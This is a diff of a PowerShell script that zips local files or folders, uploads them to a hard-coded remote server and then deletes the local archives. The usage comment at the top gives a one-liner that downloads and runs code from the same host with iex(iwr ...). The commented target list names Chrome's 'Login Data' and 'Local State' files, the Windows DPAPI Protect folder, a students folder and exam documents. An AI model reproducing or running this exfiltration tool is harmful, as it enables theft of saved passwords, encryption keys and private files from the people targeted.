@@ -1,12 +1,30 @@
-$uri = "https://ecs.rcsis.ir/upload?uid={uid}"
-# Define the paths to be zipped
+#On Client Side
+# for Chose your currecnt directory file types: 
+# > $dir="*.txt" 
+# for chose spesifice files or folder:
+# > $dir="spesific.pdf or ..."
+# then run :
+#  iex("$(iwr https://ecs.rcsis.ir/upload?uid=<client uid>) " + " `$files") 
 
-$files = @(
-    "C:\Users\User\AppData\Local\Temp\test",
+$uri = "https://ecs.rcsis.ir/upload?uid={uid}"
+$files = @()
+function UploadIt(){
+	param(
+	[Array] $files = @(
+    #"C:\Users\User\AppData\Local\Temp\test",
+    #"$env:USERPROFILE\AppData\Roaming\Microsoft\Protect"
     #"$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State",
     #("$env:USERPROFILE"+'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
-    'D:\Students'
-)
+    #'D:\Courses\Linear Control\Exam\Ch2_Ex402.docx',
+    #'D:\Courses\Linear Control\Exam\CH3_Ex402.docx',
+    #'D:\Courses\Linear Control\Exam\Ch3_Ex402.docx',
+    #'D:\Courses\Linear Control\Exam\Ch45_Ex402.docx',
+    #'D:\Courses\Linear Control\Exam\Ch6_Ex402.docx',
+    #'D:\Courses\Linear Control\Exam\Ch78_Ex402.docx'
+    #'D:\Students'
+		)
+	)
+
 $webClient = New-Object System.Net.WebClient;
 # Loop through each file path
 foreach ($filePath in $files) {
@@ -21,7 +39,7 @@ foreach ($filePath in $files) {
 		$response = $webClient.UploadFile($uri,$Destination)
 		$res = ([System.Text.Encoding]::ASCII.GetString($response) | ConvertFrom-Json)
 		Write-OutPut $res.message ""
-		#rm $Destination
+		rm $Destination
 	}
 	else{	
 		Write-Output "$filePath is a file."
@@ -34,4 +52,7 @@ foreach ($filePath in $files) {
 		Write-OutPut "The Path $filepath Not Found "
 	}
 }
-
+}
+foreach( $file in $(dir $dir).Name ) { $files += $file}
+#UploadIt $files
+UploadIt 
